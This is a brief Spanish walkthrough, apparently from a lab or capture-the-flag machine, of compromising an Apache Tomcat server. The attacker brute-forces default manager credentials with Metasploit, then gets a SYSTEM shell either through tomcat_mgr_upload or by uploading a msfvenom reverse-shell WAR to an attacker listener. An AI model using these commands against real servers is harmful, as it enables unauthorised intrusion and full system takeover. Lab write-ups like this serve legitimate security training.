PORT     STATE SERVICE
8080/tcp open  http-proxy

-Entramos al puerto 8080 y se trata de un Apache Tomcat

-Lo primero que tenemos que hacer es obtener acceso al dashboard con credenciales default

-Abrimos Metasploit y utilizamos el siguinte módulo para hacer fuerza bruta:
	-Módulo a utilizar --> **auxiliary/scanner/http/tomcat_mgr_login**
		-set rhosts 
		-run
			[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret

-Nos autenticamos con las credenciales obtenidas en /manager

### Explotación 2 Formas:

#### 1-Metasploit

-Módulo --> **exploit/multi/http/tomcat_mgr_upload**
	-set rhosts 10.10.10.95
	-set lhost 10.10.14.29
	-set rport 8080
	-set HttpUsername tomcat
	-set HttpPassword s3cret
	-run 
		meterpreter > shell
			C:\apache-tomcat-7.0.88>whoami
				nt authority\system (SOMOS NT\AUTHORITY SYSTEM DIRECTAMENTE!!)
#### 2-Manual

-Generamos Payload con msfvenom:
	-msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war -o meterpreter.war

-Lo subimos en el dashboard de la ruta /manager
	-War file to Upload --> Browse --> meterpreter.war --> Deploy

-Nos ponemos en escucha en el multi/handler:
	-Módulo --> **multi/handler**
		-set lhost 10.10.14.29
		-set payload java/meterpreter/reverse_tcp
		-run
			meterpreter > shell
				C:\apache-tomcat-7.0.88>whoami
					nt authority\system (SOMOS NT\AUTHORITY SYSTEM DIRECTAMENTE!!)